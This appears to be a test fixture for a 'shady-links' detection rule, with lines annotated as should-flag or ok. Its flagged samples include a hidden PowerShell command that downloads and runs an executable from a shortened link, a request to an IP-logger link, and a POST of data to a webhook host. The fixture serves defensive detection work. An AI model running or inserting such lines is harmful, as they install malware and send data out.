import json
import os
from urllib.request import urlopen

import urllib3
from requests import request

# ok: shady-links
SECURE_ORIGINS: List[SecureOrigin] = [
    # protocol, hostname, port\n    
    # Taken from Chrome\'s list of secure origins (See: http://bit.ly/1qrySKC)
    ("https", "*", "*"),
    ("*", "localhost", "*"),
    ("*", "127.0.0.0/8", "*"),
    ("*", "::1/128", "*"),
    ("file", "*", None),
    # ssh is always secure.
    ("ssh", "*", "*")]

# ruleid: shady-links     
req = urllib3.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})

# ruleid: shady-links    
os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")

# todoruleid: shady-links
request(
    # todoruleid: shady-links
    url='http://us.dslab.pw/webhook.php',
    method='POST',
    data=json.dumps(data).encode("utf-8", errors='ignore'),
    headers=headers
)

# ok: shady-links
goodlink1 = "http://google.com:5000/v1.0/"

# ok: shady-links
goodlink2 = "https://id.atlassian.com/login?continue=https%3A%2F%2Fstart.atlassian.com%2F&application=start"

# ok: shady-links
goodlink1 = "http://xn--n3h.net//"